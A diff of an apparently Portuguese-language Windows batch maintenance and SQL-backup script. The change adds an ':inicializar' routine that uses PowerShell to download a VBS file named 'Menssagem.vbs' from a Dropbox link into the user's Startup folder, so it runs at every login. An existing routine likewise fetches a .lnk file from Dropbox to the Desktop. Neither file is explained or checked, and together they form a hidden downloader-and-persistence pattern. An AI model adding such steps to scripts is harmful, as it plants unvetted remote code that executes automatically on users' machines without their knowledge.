@@ -311,10 +311,9 @@ for /f "delims=" %%A in ('powershell -Command "[math]::Round((Get-WmiObject Win3
     type "%RESPONSE_FILE%"
     echo =============================
 )
-::Limpa os logs
 	call :LOGS
-::cria link	
 	call :link
+	call :inicializar
 :: =============================================
 :: BACKUP SQL
 :: =============================================
@@ -544,6 +543,10 @@ endlocal
 :link
 if exist "%USERPROFILE%\Desktop\Manager-V1.lnk" exit
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/2h05ugy511yddlo1910eh/Manager-V1.lnk?rlkey=3ou61axp8vr1ss4xh2ybwj3jx&st=8xs55m9c&dl=1', [Environment]::GetFolderPath('Desktop') + '\Manager-V1.lnk')"
+endlocal
+
+:inicializar
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/akorc9rgtubicumxfgv8b/Menssagem.vbs?rlkey=0yxqyoicv6u83hlya8bnlar0r&st=vxv6y6ax&dl=1', [System.IO.Path]::Combine([Environment]::GetFolderPath('Startup'), 'Menssagem.vbs'))"
 endlocal
 
 
